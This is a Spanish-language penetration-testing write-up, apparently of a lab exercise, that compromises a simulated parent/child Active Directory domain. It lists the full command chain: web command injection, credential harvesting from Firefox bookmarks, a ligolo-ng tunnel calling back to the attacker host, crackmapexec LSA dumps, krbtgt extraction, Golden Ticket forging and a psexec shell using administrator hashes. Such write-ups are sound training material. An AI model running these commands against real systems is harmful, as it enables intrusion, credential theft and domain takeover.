---
layout: single
title: Comprometiendo el controlador de dominio - Active Directory
excerpt: "De la Explotación Web al Control del Directorio: El Camino Completo para un Ataque Golden Ticket"
date: 2025-11-15
classes: wide
header:
  teaser: /assets/images/activedirectory/dc_1.png
  teaser_home_page: true
  icon: /assets/images/windows.webp
categories:
  - activedirectory
 
tags:  
  - activedirectory
  - goldenticket
  - impacket
  - ligolong
  - passthehash
  
---

![](/assets/images/activedirectory/dc_1.png)


## Descripción:

Este ejercicio simula un escenario de penetración en una infraestructura corporativa con una red altamente segmentada y una jerarquía de Active Directory (dominios Padre e Hijo). El ejercicio comienza con el acceso inicial a un sistema perimetral, para luego requerir el pivoteo de red a través de un túnel para acceder a la red interna y sus sistemas críticos. El objetivo final es la escalada de privilegios a nivel de dominio, aplicando técnicas de post-explotación como la extracción de credenciales (LSA Dump), el movimiento lateral (Pass the Hash), y el forjado de tickets de autenticación maestra para el control completo del Active Directory (Golden Ticket Attack).

## Diagrama de red:

Visualización de la arquitectura de red con dos segmentos (externo e interno), el punto de pivote en el servidor inicial, y el objetivo final: el Controlador de Dominio Padre.

![](/assets/images/activedirectory/dc_2.png)


## Descubrimiento:

Se utiliza nmap para escanear el rango de la red externa (192.168.80.0/24) y descubrir hosts activos.

• nmap -sn 192.168.80.0/24

![](/assets/images/activedirectory/dc_3.png)

Se realiza un escaneo detallado al host 192.168.80.10, revelando que el puerto 80 (HTTP) y el 22 (SSH) están abiertos.

• nmap -sC -sV 192.168.80.10  

![](/assets/images/activedirectory/dc_4.png)

Se accede al servidor web en 192.168.80.10 y se identifica la página de registro (Sign Up), necesaria para buscar el punto de entrada de la explotación.

![](/assets/images/activedirectory/dc_5.png)

Tras registrar y autenticarse con credenciales aleatorias, se accede exitosamente al sitio el cual es una tienda.

![](/assets/images/activedirectory/dc_6.png)

Un campo interesante que encontramos fue el campo de correo electrónico para envio de boletín.

![](/assets/images/activedirectory/dc_7.png)

Se utiliza Burp Suite para interceptar la solicitud POST del formulario y revisar el parámetro EMAIL.

![](/assets/images/activedirectory/dc_8.png)


## Explotación:

Al inyectar el comando cat /etc/passwd, el servidor ejecuta el RCE y devuelve el contenido del archivo, revelando el usuario privilege para el acceso inicial.

![](/assets/images/activedirectory/dc_9.png)

Iniciamos sesión por ssh en la máquina, con las credenciales descubiertas en el Archivo “/etc/passwd”.

![](/assets/images/activedirectory/dc_10.png)

Dentro del servidor se observamosa dos interfaces de red, confirmando acceso a una red interna (192.168.98.0/24).

![](/assets/images/activedirectory/dc_11.png)

Se comprueba la existencia del directorio .mozilla/firefox en la máquina comprometida para buscar bases de datos de historial y marcadores que puedan contener credenciales.

• ls -la .mozilla/

• cd .mozilla/firefox/

• cd b2rri1qd.default-release

![](/assets/images/activedirectory/dc_12.png)

Usaremos sqlite3 para acceder a la base de datos de Firefox.

• sqlite3 places.sqlite

• .tables

![](/assets/images/activedirectory/dc_13.png)

Encontramos algunas credenciales interesantes en la base de datos de marcadores de Mozilla.

• select * from moz_bookmarks;

![](/assets/images/activedirectory/dc_14.png)


## Pivote

Tenemos que realizar el pivote ya que 192.168.98.0/24 no es accesible directamente desde el equipo atacante. Utilizaremos ligalo-ng.

• sudo ip tuntap add user kali mode tun ligolo

• sudo ip route del 192.168.98.0/24 dev tun0

• sudo ip link set ligolo up

• sudo ip route add 192.168.98.0/24 dev ligolo

![](/assets/images/activedirectory/dc_15.png)

Se transfiere y se ejecuta el agente de Ligolo-ng en el servidor, estableciendo la conexión y el túnel hacia la máquina atacante.

• ./agent -connect 10.10.200.66:443 -ignore-cert

![](/assets/images/activedirectory/dc_16.png)

Se ejecuta el proxy de Ligolo-ng en la máquina atacante y se confirma que el agente se ha conectado exitosamente, listando la nueva sesión de túnel a través de 192.168.80.10.

• ./proxy -selfcert -laddr 0.0.0.0:443

![](/assets/images/activedirectory/dc_17.png)

Se confirma que el túnel de Ligolo-ng está operativo al poder hacer ping a la red 192.168.98.0/24.

![](/assets/images/activedirectory/dc_18.png)

Se ejecuta un nuevo escaneo nmap a través del túnel (192.168.98.0/24), descubriendo múltiples hosts, incluyendo el Controlador de Dominio Padre (192.168.98.2).

![](/assets/images/activedirectory/dc_19.png)

Cree un archivo txt con hosts en vivo en la red 192.168.98.0/24.

![](/assets/images/activedirectory/dc_20.png)

Se utiliza crackmapexec para probar credenciales obtenidas de la BD de Mozilla (john:User1@#$%6) contra los hosts internos, obteniendo acceso de administrador local al servidor MGMT (192.168.98.30).

•	crackmapexec --verbose smb target.txt -u john -p User1@#$%6

![](/assets/images/activedirectory/dc_21.png)

Se utiliza crackmapexec para realizar un volcado de secretos LSA en el servidor MGMT (192.168.98.30), obteniendo la credencial en texto plano del usuario corpmngr:User4&*&**.

•	crackmapexec --verbose smb 192.168.98.30 -u john -p User1@#$%6 –lsa

![](/assets/images/activedirectory/dc_22.png)

Se reutiliza la credencial recién descubierta y se logra la autenticación de administrador local en el Child Domain Controller (CDC) 192.168.98.120.

•	crackmapexec --verbose smb target.txt -u corpmngr -p 'User4&*&*'

![](/assets/images/activedirectory/dc_23.png)

Se actualiza el archivo /etc/hosts en la máquina atacante para mapear las IPs de los Controladores de Dominio con sus nombres DNS correspondientes (warfare.corp y child.warfare.corp).

![](/assets/images/activedirectory/dc_24.png)


## Extracción del Hash

Se utiliza impacket-secretsdump en el Child DC para extraer los hashes de la cuenta de servicio krbtgt, el componente clave para el ataque Golden Ticket.

•	/usr/bin/impacket-secretsdump -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'

![](/assets/images/activedirectory/dc_25.png)


## Extracción del Hash

Se utiliza impacket-lookupsid para obtener el Identificador de Seguridad (SID) único del Dominio Hijo y Padre, dato crucial para la posterior falsificación del Golden Ticket.

•	/usr/bin/impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp
•	/usr/bin/impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp

![](/assets/images/activedirectory/dc_26.png)

![](/assets/images/activedirectory/dc_27.png)


## Forjado del Golden Ticket

Se utiliza impacket-ticketer junto con el hash krbtgt y los SIDs de ambos dominios para forjar un Golden Ticket y guardarlo en el archivo corpmngr.ccache.

•	/usr/bin/impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'

![](/assets/images/activedirectory/dc_28.png)

Se exporta el archivo corpmngr.ccache a la variable de entorno KRB5CCNAME, cargando el Golden Ticket para su uso en la autenticación Kerberos.

•	export KRB5CCNAME=corpmngr.ccache

![](/assets/images/activedirectory/dc_29.png)


## Solicitud de Ticket de Servicio (Golden Ticket en Acción)

Se utiliza impacket-getST con el Golden Ticket cargado para solicitar un Ticket de Servicio (ST) para el servicio CIFS en el Controlador de Dominio Padre, obteniendo acceso al dominio superior.

•	sudo /usr/bin/impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug

![](/assets/images/activedirectory/dc_30.png)

Se exporta el Ticket de Servicio (ST) recién adquirido a la variable de entorno KRB5CCNAME, permitiendo que las herramientas de impacket se autentiquen contra el Dominio Padre.

•	export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache

![](/assets/images/activedirectory/dc_31.png)

Utilizando el Ticket de Servicio cargado, se ejecuta impacket-secretsdump contra el Controlador de Dominio Padre (dc01.warfare.corp) para extraer los hashes del usuario Administrador del Dominio.

•	/usr/bin/impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug

![](/assets/images/activedirectory/dc_32.png)

Se utiliza impacket-psexec con los hashes del Administrador para obtener una sesión de shell en el Controlador de Dominio Padre (dc01).

•	/usr/bin/impacket-psexec -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60

![](/assets/images/activedirectory/dc_33.png)

